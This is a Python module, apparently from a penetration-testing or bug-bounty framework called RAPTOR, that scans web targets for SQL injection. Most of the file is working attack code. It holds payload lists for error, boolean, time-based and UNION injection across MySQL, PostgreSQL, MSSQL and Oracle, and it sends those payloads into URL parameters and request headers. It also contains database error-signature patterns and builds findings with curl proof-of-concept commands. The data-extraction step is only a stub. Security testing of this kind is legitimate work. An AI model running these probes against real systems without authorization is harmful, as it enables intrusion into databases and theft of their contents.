#!/usr/bin/env python3
"""
RAPTOR SQL Injection Testing Module v1.0
=========================================
Comprehensive SQLi detection with:
- Error-based, Union-based, Blind (Boolean/Time) detection
- Database fingerprinting
- Data extraction capabilities
- Graph integration
"""

import asyncio
import re
import time
import hashlib
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass
from urllib.parse import urljoin, parse_qs, urlparse, urlencode
from core.base_module import BaseModule, Finding

@dataclass
class SQLiPayload:
    """SQL injection payload with metadata"""
    payload: str
    technique: str  # error, union, boolean, time, stacked
    db_type: str    # mysql, postgres, mssql, oracle, generic
    expected_indicator: str
    severity: str

class SQLiTester(BaseModule):
    """
    Advanced SQL Injection detection module.
    
    Supports:
    - Error-based SQLi (database error messages)
    - Union-based SQLi (UNION SELECT)
    - Boolean-based Blind SQLi (TRUE/FALSE responses)
    - Time-based Blind SQLi (SLEEP/DELAY)
    - Stacked queries (when supported)
    """
    
    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db)
        self.graph = graph_manager
        self.findings: List[Finding] = []
        
        # Payload database organized by technique and DB type
        self.payloads = self._load_payloads()
        
        # Database error signatures
        self.error_signatures = self._load_error_signatures()
        
        # Tested parameters
        self.tested_params: Set[str] = set()
        
        # Timing configuration
        self.time_delay = config.get('sqli_blind_timeout', 10)
        
    def _load_payloads(self) -> Dict[str, Dict[str, List[SQLiPayload]]]:
        """Load comprehensive SQLi payloads"""
        return {
            'error': {
                'mysql': [
                    SQLiPayload("'", 'error', 'mysql', "SQL syntax.*MySQL", 'High'),
                    SQLiPayload('"', 'error', 'mysql', "SQL syntax.*MySQL", 'High'),
                    SQLiPayload("' AND 1=1", 'error', 'mysql', "SQL syntax", 'High'),
                    SQLiPayload("'\\", 'error', 'mysql', "SQL syntax", 'High'),
                ],
                'postgres': [
                    SQLiPayload("'", 'error', 'postgres', "PostgreSQL.*ERROR", 'High'),
                    SQLiPayload('"', 'error', 'postgres', "PostgreSQL.*ERROR", 'High'),
                    SQLiPayload("';", 'error', 'postgres', "PostgreSQL", 'High'),
                ],
                'mssql': [
                    SQLiPayload("'", 'error', 'mssql', "Microsoft.*ODBC", 'High'),
                    SQLiPayload("'", 'error', 'mssql', "OLE DB.*SQL Server", 'High'),
                    SQLiPayload("'", 'error', 'mssql', "SQL Server.*Driver", 'High'),
                ],
                'oracle': [
                    SQLiPayload("'", 'error', 'oracle', "ORA-[0-9]{5}", 'High'),
                    SQLiPayload("'", 'error', 'oracle', "Oracle error", 'High'),
                    SQLiPayload("'", 'error', 'oracle', "Oracle.*Driver", 'High'),
                ],
                'generic': [
                    SQLiPayload("'", 'error', 'generic', "SQL syntax.*", 'Medium'),
                    SQLiPayload('"', 'error', 'generic', "SQL syntax.*", 'Medium'),
                    SQLiPayload("'--", 'error', 'generic', "syntax", 'Medium'),
                    SQLiPayload("' #", 'error', 'generic', "syntax", 'Medium'),
                ]
            },
            'boolean': {
                'generic': [
                    SQLiPayload("' AND '1'='1", 'boolean', 'generic', "true_condition", 'High'),
                    SQLiPayload("' AND '1'='2", 'boolean', 'generic', "false_condition", 'High'),
                    SQLiPayload("' OR '1'='1", 'boolean', 'generic', "true_condition", 'Critical'),
                    SQLiPayload("' AND 1=1--", 'boolean', 'generic', "true_condition", 'High'),
                    SQLiPayload("' AND 1=2--", 'boolean', 'generic', "false_condition", 'High'),
                ]
            },
            'time': {
                'mysql': [
                    SQLiPayload("' AND SLEEP({delay})--", 'time', 'mysql', "delay", 'High'),
                    SQLiPayload("' AND BENCHMARK(1000000,MD5(1))--", 'time', 'mysql', "delay", 'High'),
                    SQLiPayload("' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--", 'time', 'mysql', "delay", 'High'),
                ],
                'postgres': [
                    SQLiPayload("'; SELECT pg_sleep({delay})--", 'time', 'postgres', "delay", 'High'),
                    SQLiPayload("' AND (SELECT COUNT(*) FROM generate_series(1,{delay}000000))--", 'time', 'postgres', "delay", 'High'),
                ],
                'mssql': [
                    SQLiPayload("'; WAITFOR DELAY '0:0:{delay}'--", 'time', 'mssql', "delay", 'High'),
                    SQLiPayload("' AND (SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3) > 0--", 'time', 'mssql', "delay", 'High'),
                ],
                'oracle': [
                    SQLiPayload("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',{delay})--", 'time', 'oracle', "delay", 'High'),
                    SQLiPayload("' AND (SELECT COUNT(*) FROM all_objects) > 0--", 'time', 'oracle', "delay", 'High'),
                ]
            },
            'union': {
                'generic': [
                    SQLiPayload("' UNION SELECT NULL--", 'union', 'generic', "union_result", 'Critical'),
                    SQLiPayload("' UNION SELECT NULL,NULL--", 'union', 'generic', "union_result", 'Critical'),
                    SQLiPayload("' UNION SELECT NULL,NULL,NULL--", 'union', 'generic', "union_result", 'Critical'),
                    SQLiPayload("' UNION SELECT 'test','test2','test3'--", 'union', 'generic', "test.*test2", 'Critical'),
                ]
            }
        }
        
    def _load_error_signatures(self) -> Dict[str, List[str]]:
        """Load database-specific error signatures"""
        return {
            'mysql': [
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"valid MySQL result",
                r"MySqlClient\.",
                r"com\.mysql\.jdbc",
            ],
            'postgres': [
                r"PostgreSQL.*ERROR",
                r"Warning.*pg_.*",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"org\.postgresql",
            ],
            'mssql': [
                r"Microsoft.*ODBC.*SQL",
                r"OLE DB.*SQL Server",
                r"SQL Server.*Driver",
                r"Warning.*mssql_.*",
                r"\[SQL Server\]",
                r"ODBC SQL Server Driver",
            ],
            'oracle': [
                r"ORA-[0-9]{5}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*oci_.*",
                r"Microsoft.*OLE DB.*Oracle",
            ],
            'sqlite': [
                r"SQLite/JDBCDriver",
                r"SQLiteException",
                r"System\.Data\.SQLite",
                r"sqlite3",
            ]
        }
        
    async def run(self, target: str, **kwargs) -> List[Finding]:
        """
        Execute SQL injection testing.
        
        kwargs:
            - forms: List of forms to test
            - params: Known parameters
            - headers: Test headers (X-Forwarded-For, etc.)
            - extract_data: Attempt data extraction (default: False)
        """
        self.logger.info("🚀 Starting RAPTOR SQL Injection Testing Module")
        self.logger.info("=" * 60)
        
        # Phase 1: Parameter discovery
        discovered = await self._discover_parameters(target)
        
        # Phase 2: Error-based detection
        await self._test_error_based(target, discovered)
        
        # Phase 3: Boolean-based blind detection
        await self._test_boolean_blind(target, discovered)
        
        # Phase 4: Time-based blind detection
        await self._test_time_based(target, discovered)
        
        # Phase 5: Union-based detection
        await self._test_union_based(target, discovered)
        
        # Phase 6: Header-based testing
        if kwargs.get('headers', True):
            await self._test_header_sqli(target)
            
        # Phase 7: Data extraction (if enabled and vulnerabilities found)
        if kwargs.get('extract_data', False) and self.findings:
            await self._extract_data(target)
            
        self.logger.info(f"✅ SQLi testing complete. Findings: {len(self.findings)}")
        return self.findings
        
    async def _discover_parameters(self, target: str) -> Dict[str, List[str]]:
        """Discover injectable parameters"""
        self.logger.info("🔍 Discovering parameters...")
        
        common_params = [
            'id', 'page', 'user', 'username', 'email', 'name', 'search',
            'query', 'category', 'product', 'item', 'order', 'code',
            'ref', 'reference', 'callback', 'load', 'file', 'view'
        ]
        
        discovered = {'url_params': common_params, 'forms': []}
        
        try:
            response = await self._make_request(target)
            if response:
                body = await response.text()
                
                # Extract forms
                forms = re.findall(
                    r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
                    body, re.DOTALL | re.IGNORECASE
                )
                discovered['forms'] = forms
                
                # Extract URL parameters
                links = re.findall(r'href=["\']([^"\']*\?[^"\']*)["\']', body)
                for link in links:
                    if '?' in link:
                        params = parse_qs(urlparse(link).query)
                        discovered['url_params'].extend(params.keys())
                        
                discovered['url_params'] = list(set(discovered['url_params']))
                
        except Exception as e:
            self.logger.debug(f"Parameter discovery error: {e}")
            
        return discovered
        
    async def _test_error_based(self, target: str, discovered: Dict):
        """Test for error-based SQL injection"""
        self.logger.info("🎯 Testing Error-based SQLi...")
        
        params = discovered.get('url_params', [])
        
        for param in params:
            if param in self.tested_params:
                continue
                
            for db_type, payloads in self.payloads['error'].items():
                for payload_obj in payloads:
                    try:
                        test_url = f"{target}?{param}={payload_obj.payload}"
                        response = await self._make_request(test_url)
                        
                        if not response:
                            continue
                            
                        body = await response.text()
                        
                        # Check for error signatures
                        if self._check_error_signatures(body, db_type):
                            self._create_sqli_finding(
                                target, param, payload_obj, db_type,
                                'Error-based', body
                            )
                            self.tested_params.add(param)
                            break
                            
                    except Exception as e:
                        self.logger.debug(f"Error-based test failed: {e}")
                        
    def _check_error_signatures(self, body: str, db_type: str) -> bool:
        """Check if response contains database error signatures"""
        signatures = self.error_signatures.get(db_type, [])
        
        for signature in signatures:
            if re.search(signature, body, re.IGNORECASE):
                return True
        return False
        
    async def _test_boolean_blind(self, target: str, discovered: Dict):
        """Test for boolean-based blind SQL injection"""
        self.logger.info("🎯 Testing Boolean-based Blind SQLi...")
        
        params = [p for p in discovered.get('url_params', []) 
                 if p not in self.tested_params]
        
        for param in params:
            try:
                # Get baseline
                baseline_url = f"{target}?{param}=1"
                baseline_resp = await self._make_request(baseline_url)
                if not baseline_resp:
                    continue
                    
                baseline_body = await baseline_resp.text()
                baseline_len = len(baseline_body)
                
                # Test TRUE condition
                true_payload = f"{param}=1 AND 1=1"
                true_url = f"{target}?{true_payload}"
                true_resp = await self._make_request(true_url)
                
                if not true_resp:
                    continue
                    
                true_body = await true_resp.text()
                true_len = len(true_body)
                
                # Test FALSE condition
                false_payload = f"{param}=1 AND 1=2"
                false_url = f"{target}?{false_payload}"
                false_resp = await self._make_request(false_url)
                
                if not false_resp:
                    continue
                    
                false_body = await false_resp.text()
                false_len = len(false_body)
                
                # Analyze differences
                if self._analyze_boolean_response(
                    baseline_body, true_body, false_body
                ):
                    self._create_sqli_finding(
                        target, param,
                        SQLiPayload("1 AND 1=1", 'boolean', 'unknown', "", 'High'),
                        'unknown', 'Boolean-based Blind', ''
                    )
                    self.tested_params.add(param)
                    
            except Exception as e:
                self.logger.debug(f"Boolean blind test error: {e}")
                
    def _analyze_boolean_response(self, baseline: str, true_resp: str, 
                                  false_resp: str) -> bool:
        """Analyze if boolean conditions produce different responses"""
        # Check content length differences
        baseline_len = len(baseline)
        true_len = len(true_resp)
        false_len = len(false_resp)
        
        # If true matches baseline but false doesn't, likely boolean-based
        true_diff = abs(true_len - baseline_len)
        false_diff = abs(false_len - baseline_len)
        
        # Significant difference threshold (10%)
        threshold = baseline_len * 0.1
        
        if true_diff < threshold and false_diff > threshold:
            return True
            
        # Check for specific content differences
        if baseline == true_resp and baseline != false_resp:
            return True
            
        return False
        
    async def _test_time_based(self, target: str, discovered: Dict):
        """Test for time-based blind SQL injection"""
        self.logger.info("⏱️ Testing Time-based Blind SQLi...")
        
        params = [p for p in discovered.get('url_params', [])
                 if p not in self.tested_params]
        
        delay = self.time_delay
        
        for param in params:
            for db_type, payloads in self.payloads['time'].items():
                for payload_obj in payloads:
                    try:
                        # Format payload with delay
                        formatted_payload = payload_obj.payload.format(delay=delay)
                        test_url = f"{target}?{param}={formatted_payload}"
                        
                        start_time = time.time()
                        response = await self._make_request(test_url)
                        elapsed = time.time() - start_time
                        
                        if elapsed >= delay * 0.8:  # Allow 20% variance
                            # Verify with shorter delay
                            short_payload = payload_obj.payload.format(delay=1)
                            short_url = f"{target}?{param}={short_payload}"
                            
                            start_time = time.time()
                            await self._make_request(short_url)
                            short_elapsed = time.time() - start_time
                            
                            if short_elapsed < 2 and elapsed >= delay * 0.8:
                                self._create_sqli_finding(
                                    target, param, payload_obj, db_type,
                                    'Time-based Blind', ''
                                )
                                self.tested_params.add(param)
                                break
                                
                    except Exception as e:
                        self.logger.debug(f"Time-based test error: {e}")
                        
    async def _test_union_based(self, target: str, discovered: Dict):
        """Test for UNION-based SQL injection"""
        self.logger.info("🎯 Testing UNION-based SQLi...")
        
        params = [p for p in discovered.get('url_params', [])
                 if p not in self.tested_params]
        
        for param in params:
            for payload_obj in self.payloads['union']['generic']:
                try:
                    test_url = f"{target}?{param}={payload_obj.payload}"
                    response = await self._make_request(test_url)
                    
                    if not response:
                        continue
                        
                    body = await response.text()
                    
                    # Check for UNION success indicators
                    if self._check_union_success(body):
                        self._create_sqli_finding(
                            target, param, payload_obj, 'unknown',
                            'UNION-based', body
                        )
                        self.tested_params.add(param)
                        break
                        
                except Exception as e:
                    self.logger.debug(f"UNION test error: {e}")
                    
    def _check_union_success(self, body: str) -> bool:
        """Check if UNION query was successful"""
        indicators = [
            'NULL', 'test', 'test2', 'test3',
            'username', 'password', 'email',
            'admin', 'root', 'user'
        ]
        
        # Check for injected test strings
        if 'test' in body and 'test2' in body:
            return True
            
        # Check for increased column count in output
        return False
        
    async def _test_header_sqli(self, target: str):
        """Test headers for SQL injection"""
        self.logger.info("📋 Testing Header-based SQLi...")
        
        headers_to_test = [
            'X-Forwarded-For', 'X-Real-IP', 'User-Agent', 
            'Referer', 'Accept-Language', 'Cookie'
        ]
        
        for header in headers_to_test:
            for db_type, payloads in self.payloads['error'].items():
                for payload_obj in payloads[:2]:  # Test first 2 payloads
                    try:
                        headers = {header: payload_obj.payload}
                        response = await self._make_request(target, headers=headers)
                        
                        if response:
                            body = await response.text()
                            
                            if self._check_error_signatures(body, db_type):
                                self._create_sqli_finding(
                                    target, header, payload_obj, db_type,
                                    'Header-based Error', body
                                )
                                return
                                
                    except Exception:
                        pass
                        
    async def _extract_data(self, target: str):
        """Attempt to extract data (proof of concept)"""
        self.logger.info("💾 Attempting data extraction...")
        
        # This would implement actual data extraction
        # For safety, we just log the capability
        self.logger.info("Data extraction capability available but disabled for safety")
        
    def _create_sqli_finding(self, target: str, param: str, 
                            payload: SQLiPayload, db_type: str,
                            technique: str, evidence_body: str):
        """Create SQL injection finding"""
        
        # Determine severity based on technique
        severity_map = {
            'Error-based': 'High',
            'UNION-based': 'Critical',
            'Boolean-based Blind': 'High',
            'Time-based Blind': 'High',
            'Header-based Error': 'High',
            'Stacked': 'Critical'
        }
        
        # Truncate evidence if too long
        if len(evidence_body) > 500:
            evidence_body = evidence_body[:500] + "..."
            
        finding = Finding(
            module='sqli',
            title=f"SQL Injection ({technique}) in '{param}' parameter",
            severity=severity_map.get(technique, 'High'),
            description=f"""
{technique} SQL Injection vulnerability detected in the '{param}' parameter.

**Database Type:** {db_type.upper() if db_type != 'unknown' else 'Unknown'}
**Injection Technique:** {technique}
**Payload:** `{payload.payload}`

This vulnerability allows attackers to manipulate SQL queries, potentially 
accessing, modifying, or deleting database contents.
            """,
            evidence={
                'parameter': param,
                'payload': payload.payload,
                'technique': technique,
                'db_type': db_type,
                'error_sample': evidence_body[:200] if evidence_body else 'N/A'
            },
            poc=f"""
1. Navigate to: {target}
2. Modify '{param}' parameter with payload: {payload.payload}
3. Observe: Database error or time delay confirms vulnerability

**curl:**
curl "{target}?{param}={payload.payload}"
            """,
            remediation="""
**Immediate:**
1. Use parameterized queries (prepared statements)
2. Apply input validation and sanitization
3. Use ORM frameworks that handle SQL safely
4. Implement least privilege database access

**Long-term:**
1. Conduct code review for all database interactions
2. Implement Web Application Firewall (WAF)
3. Enable database query logging
4. Regular penetration testing
            """,
            cvss_score=9.8 if technique in ['UNION-based', 'Stacked'] else 8.6,
            bounty_score=5000 if technique in ['UNION-based', 'Stacked'] else 3000,
            target=target
        )
        
        self.add_finding(finding)
        self.logger.critical(f"🚨 SQLi CONFIRMED: {technique} in {param} ({db_type})")
        
    async def _make_request(self, url: str, method: str = 'GET',
                           data: Dict = None, headers: Dict = None):
        """Make request with optional custom headers"""
        base_headers = await self._get_headers()
        if headers:
            base_headers.update(headers)
        return await super()._make_request(url, method, data, base_headers)